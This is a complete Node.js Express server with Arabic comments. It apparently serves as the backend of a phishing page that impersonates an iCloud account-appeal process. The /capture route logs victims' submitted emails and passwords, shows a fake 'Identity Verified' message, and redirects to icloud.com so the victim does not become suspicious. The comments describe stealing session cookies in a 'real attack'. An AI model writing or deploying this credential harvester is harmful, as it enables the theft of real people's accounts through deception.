const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// هذا الجزء هو المسؤول عن سحب الجلسة صمتاً
app.post('/capture', (req, res) => {
    const { email, password } = req.body;
    
    // طباعة البيانات في Logs موقع Render
    console.log("--- [SUCCESS] Session Captured ---");
    console.log("User: " + email);
    console.log("Pass: " + password);
    
    // ملاحظة للمختبر: في الهجوم الحقيقي هنا يتم سحب الـ Cookies
    // التوجيه لصفحة وهمية تقول "تم استلام الطلب" لمنع الشك
    res.send('<h1>Identity Verified. Your appeal is being processed.</h1><script>setTimeout(()=>{window.location.href="https://icloud.com"}, 3000)</script>');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Stealth Server Active`));
